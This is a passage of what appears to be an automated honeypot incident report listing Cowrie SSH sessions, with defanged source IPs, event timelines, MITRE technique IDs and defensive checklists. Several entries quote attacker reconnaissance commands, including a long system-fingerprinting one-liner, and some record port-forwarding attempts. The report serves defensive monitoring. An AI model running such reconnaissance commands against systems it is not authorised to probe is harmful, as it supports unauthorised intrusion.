**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afd504c51fe5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:27` | `cowrie.session.connect` |
| `2026-07-04 15:11:27` | `cowrie.client.version` |
| `2026-07-04 15:11:27` | `cowrie.client.kex` |
| `2026-07-04 15:11:28` | `cowrie.login.success` |
| `2026-07-04 15:11:28` | `cowrie.session.params` |
| `2026-07-04 15:11:28` | `cowrie.command.input` |
| `2026-07-04 15:11:28` | `cowrie.log.closed` |
| `2026-07-04 15:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-095d8241e4cc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:30` | `cowrie.session.connect` |
| `2026-07-04 15:11:30` | `cowrie.client.version` |
| `2026-07-04 15:11:30` | `cowrie.client.kex` |
| `2026-07-04 15:11:31` | `cowrie.login.success` |
| `2026-07-04 15:11:31` | `cowrie.session.params` |
| `2026-07-04 15:11:31` | `cowrie.command.input` |
| `2026-07-04 15:11:32` | `cowrie.log.closed` |
| `2026-07-04 15:11:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c90c52ac90d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:33` | `cowrie.session.connect` |
| `2026-07-04 15:11:33` | `cowrie.client.version` |
| `2026-07-04 15:11:33` | `cowrie.client.kex` |
| `2026-07-04 15:11:34` | `cowrie.login.success` |
| `2026-07-04 15:11:34` | `cowrie.session.params` |
| `2026-07-04 15:11:35` | `cowrie.command.input` |
| `2026-07-04 15:11:35` | `cowrie.log.closed` |
| `2026-07-04 15:11:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd18fe68a1a9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:37` | `cowrie.session.connect` |
| `2026-07-04 15:11:37` | `cowrie.client.version` |
| `2026-07-04 15:11:37` | `cowrie.client.kex` |
| `2026-07-04 15:11:37` | `cowrie.login.success` |
| `2026-07-04 15:11:38` | `cowrie.session.params` |
| `2026-07-04 15:11:38` | `cowrie.command.input` |
| `2026-07-04 15:11:38` | `cowrie.log.closed` |
| `2026-07-04 15:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ad87da05f12

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:40` | `cowrie.session.connect` |
| `2026-07-04 15:11:40` | `cowrie.client.version` |
| `2026-07-04 15:11:40` | `cowrie.client.kex` |
| `2026-07-04 15:11:40` | `cowrie.login.success` |
| `2026-07-04 15:11:41` | `cowrie.session.params` |
| `2026-07-04 15:11:41` | `cowrie.command.input` |
| `2026-07-04 15:11:41` | `cowrie.log.closed` |
| `2026-07-04 15:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23deebaae1b9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:43` | `cowrie.session.connect` |
| `2026-07-04 15:11:43` | `cowrie.client.version` |
| `2026-07-04 15:11:43` | `cowrie.client.kex` |
| `2026-07-04 15:11:43` | `cowrie.login.success` |
| `2026-07-04 15:11:44` | `cowrie.session.params` |
| `2026-07-04 15:11:44` | `cowrie.command.input` |
| `2026-07-04 15:11:44` | `cowrie.log.closed` |
| `2026-07-04 15:11:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22ab2163eb94

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:46` | `cowrie.session.connect` |
| `2026-07-04 15:11:46` | `cowrie.client.version` |
| `2026-07-04 15:11:46` | `cowrie.client.kex` |
| `2026-07-04 15:11:46` | `cowrie.login.success` |
| `2026-07-04 15:11:47` | `cowrie.session.params` |
| `2026-07-04 15:11:47` | `cowrie.command.input` |
| `2026-07-04 15:11:47` | `cowrie.log.closed` |
| `2026-07-04 15:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b95dde54dbda

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:11 |
| **Last Seen** | 2026-07-04 15:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:11:49` | `cowrie.session.connect` |
| `2026-07-04 15:11:49` | `cowrie.client.version` |
| `2026-07-04 15:11:49` | `cowrie.client.kex` |
| `2026-07-04 15:11:50` | `cowrie.login.success` |
| `2026-07-04 15:11:50` | `cowrie.session.params` |
| `2026-07-04 15:11:50` | `cowrie.command.input` |
| `2026-07-04 15:11:51` | `cowrie.log.closed` |
| `2026-07-04 15:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba175f7eacbc

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 15:22 |
| **Last Seen** | 2026-07-04 15:23 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:22:57` | `cowrie.session.connect` |
| `2026-07-04 15:22:58` | `cowrie.client.version` |
| `2026-07-04 15:22:58` | `cowrie.client.kex` |
| `2026-07-04 15:23:03` | `cowrie.login.success` |
| `2026-07-04 15:23:07` | `cowrie.session.params` |
| `2026-07-04 15:23:07` | `cowrie.command.input` |
| `2026-07-04 15:23:09` | `cowrie.log.closed` |
| `2026-07-04 15:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c31f2849328

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 15:24 |
| **Last Seen** | 2026-07-04 15:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:24:27` | `cowrie.session.connect` |
| `2026-07-04 15:24:27` | `cowrie.client.version` |
| `2026-07-04 15:24:27` | `cowrie.client.kex` |
| `2026-07-04 15:24:27` | `cowrie.login.success` |
| `2026-07-04 15:24:27` | `cowrie.direct-tcpip.request` |
| `2026-07-04 15:24:27` | `cowrie.direct-tcpip.data` |
| `2026-07-04 15:24:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b48ad61e144

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-04 15:32 |
| **Last Seen** | 2026-07-04 15:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:32:30` | `cowrie.session.connect` |
| `2026-07-04 15:32:30` | `cowrie.client.version` |
| `2026-07-04 15:32:30` | `cowrie.client.kex` |
| `2026-07-04 15:32:31` | `cowrie.login.success` |
| `2026-07-04 15:32:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c68314f8ba7

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-04 15:32 |
| **Last Seen** | 2026-07-04 15:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:32:30` | `cowrie.session.connect` |
| `2026-07-04 15:32:30` | `cowrie.client.version` |
| `2026-07-04 15:32:30` | `cowrie.client.kex` |
| `2026-07-04 15:32:31` | `cowrie.login.success` |
| `2026-07-04 15:32:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-079d74808cad

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 15:33 |
| **Last Seen** | 2026-07-04 15:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:33:16` | `cowrie.session.connect` |
| `2026-07-04 15:33:16` | `cowrie.client.version` |
| `2026-07-04 15:33:16` | `cowrie.client.kex` |
| `2026-07-04 15:33:19` | `cowrie.login.success` |
| `2026-07-04 15:33:21` | `cowrie.session.params` |
| `2026-07-04 15:33:21` | `cowrie.command.input` |
| `2026-07-04 15:33:21` | `cowrie.command.input` |
| `2026-07-04 15:33:21` | `cowrie.command.input` |
| `2026-07-04 15:33:21` | `cowrie.command.input` |
| `2026-07-04 15:33:21` | `cowrie.command.input` |
| `2026-07-04 15:33:21` | `cowrie.command.success` |
| `2026-07-04 15:33:21` | `cowrie.command.input` |
| `2026-07-04 15:33:21` | `cowrie.command.input` |
| `2026-07-04 15:33:21` | `cowrie.command.input` |
| `2026-07-04 15:33:21` | `cowrie.command.input` |
| `2026-07-04 15:33:22` | `cowrie.log.closed` |
| `2026-07-04 15:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f10d62a35b5d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 15:33 |
| **Last Seen** | 2026-07-04 15:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:33:30` | `cowrie.session.connect` |
| `2026-07-04 15:33:30` | `cowrie.client.version` |
| `2026-07-04 15:33:31` | `cowrie.client.kex` |
| `2026-07-04 15:33:31` | `cowrie.login.success` |
| `2026-07-04 15:33:31` | `cowrie.direct-tcpip.request` |
| `2026-07-04 15:33:31` | `cowrie.direct-tcpip.data` |
| `2026-07-04 15:33:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd224e32f613

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 15:35 |
| **Last Seen** | 2026-07-04 15:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:35:26` | `cowrie.session.connect` |
| `2026-07-04 15:35:27` | `cowrie.client.version` |
| `2026-07-04 15:35:27` | `cowrie.client.kex` |
| `2026-07-04 15:35:30` | `cowrie.login.success` |
| `2026-07-04 15:35:33` | `cowrie.session.params` |
| `2026-07-04 15:35:33` | `cowrie.command.input` |
| `2026-07-04 15:35:33` | `cowrie.command.input` |
| `2026-07-04 15:35:33` | `cowrie.command.input` |
| `2026-07-04 15:35:33` | `cowrie.command.input` |
| `2026-07-04 15:35:33` | `cowrie.command.input` |
| `2026-07-04 15:35:33` | `cowrie.command.success` |
| `2026-07-04 15:35:33` | `cowrie.command.input` |
| `2026-07-04 15:35:33` | `cowrie.command.input` |
| `2026-07-04 15:35:33` | `cowrie.command.input` |
| `2026-07-04 15:35:33` | `cowrie.command.input` |
| `2026-07-04 15:35:33` | `cowrie.log.closed` |
| `2026-07-04 15:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c5b9ca15f1e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 15:35 |
| **Last Seen** | 2026-07-04 15:35 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:35:34` | `cowrie.session.connect` |
| `2026-07-04 15:35:37` | `cowrie.client.version` |
| `2026-07-04 15:35:37` | `cowrie.client.kex` |
| `2026-07-04 15:35:45` | `cowrie.login.success` |
| `2026-07-04 15:35:48` | `cowrie.session.params` |
| `2026-07-04 15:35:48` | `cowrie.command.input` |
| `2026-07-04 15:35:49` | `cowrie.log.closed` |
| `2026-07-04 15:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b31d9430fbe

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 15:37 |
| **Last Seen** | 2026-07-04 15:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:37:35` | `cowrie.session.connect` |
| `2026-07-04 15:37:36` | `cowrie.client.version` |
| `2026-07-04 15:37:36` | `cowrie.client.kex` |
| `2026-07-04 15:37:38` | `cowrie.login.success` |
| `2026-07-04 15:37:41` | `cowrie.session.params` |
| `2026-07-04 15:37:41` | `cowrie.command.input` |
| `2026-07-04 15:37:41` | `cowrie.command.input` |
| `2026-07-04 15:37:41` | `cowrie.command.input` |
| `2026-07-04 15:37:41` | `cowrie.command.input` |
| `2026-07-04 15:37:41` | `cowrie.command.input` |
| `2026-07-04 15:37:41` | `cowrie.command.success` |
| `2026-07-04 15:37:41` | `cowrie.command.input` |
| `2026-07-04 15:37:41` | `cowrie.command.input` |
| `2026-07-04 15:37:41` | `cowrie.command.input` |
| `2026-07-04 15:37:41` | `cowrie.command.input` |
| `2026-07-04 15:37:41` | `cowrie.log.closed` |
| `2026-07-04 15:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-879ab2e9a638

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 15:39 |
| **Last Seen** | 2026-07-04 15:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:39:37` | `cowrie.session.connect` |
| `2026-07-04 15:39:38` | `cowrie.client.version` |
| `2026-07-04 15:39:38` | `cowrie.client.kex` |
| `2026-07-04 15:39:40` | `cowrie.login.success` |
| `2026-07-04 15:39:42` | `cowrie.session.params` |
| `2026-07-04 15:39:42` | `cowrie.command.input` |
| `2026-07-04 15:39:42` | `cowrie.command.input` |
| `2026-07-04 15:39:42` | `cowrie.command.input` |
| `2026-07-04 15:39:42` | `cowrie.command.input` |
| `2026-07-04 15:39:42` | `cowrie.command.input` |
| `2026-07-04 15:39:42` | `cowrie.command.success` |
| `2026-07-04 15:39:42` | `cowrie.command.input` |
| `2026-07-04 15:39:42` | `cowrie.command.input` |
| `2026-07-04 15:39:42` | `cowrie.command.input` |
| `2026-07-04 15:39:42` | `cowrie.command.input` |
| `2026-07-04 15:39:43` | `cowrie.log.closed` |
| `2026-07-04 15:39:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-092a29644560

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 15:40 |
| **Last Seen** | 2026-07-04 15:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:40:32` | `cowrie.session.connect` |
| `2026-07-04 15:40:32` | `cowrie.client.version` |
| `2026-07-04 15:40:32` | `cowrie.client.kex` |
| `2026-07-04 15:40:32` | `cowrie.login.success` |
| `2026-07-04 15:40:32` | `cowrie.direct-tcpip.request` |
| `2026-07-04 15:40:32` | `cowrie.direct-tcpip.data` |
| `2026-07-04 15:40:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c6990904bd8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 15:43 |
| **Last Seen** | 2026-07-04 15:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:43:43` | `cowrie.session.connect` |
| `2026-07-04 15:43:43` | `cowrie.client.version` |
| `2026-07-04 15:43:43` | `cowrie.client.kex` |
| `2026-07-04 15:43:45` | `cowrie.login.success` |
| `2026-07-04 15:43:47` | `cowrie.session.params` |
| `2026-07-04 15:43:47` | `cowrie.command.input` |
| `2026-07-04 15:43:47` | `cowrie.command.input` |
| `2026-07-04 15:43:47` | `cowrie.command.input` |
| `2026-07-04 15:43:47` | `cowrie.command.input` |
| `2026-07-04 15:43:47` | `cowrie.command.input` |
| `2026-07-04 15:43:47` | `cowrie.command.success` |
| `2026-07-04 15:43:47` | `cowrie.command.input` |
| `2026-07-04 15:43:47` | `cowrie.command.input` |
| `2026-07-04 15:43:47` | `cowrie.command.input` |
| `2026-07-04 15:43:47` | `cowrie.command.input` |
| `2026-07-04 15:43:47` | `cowrie.log.closed` |
| `2026-07-04 15:43:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c41d59a655f1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-04 15:45 |
| **Last Seen** | 2026-07-04 15:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
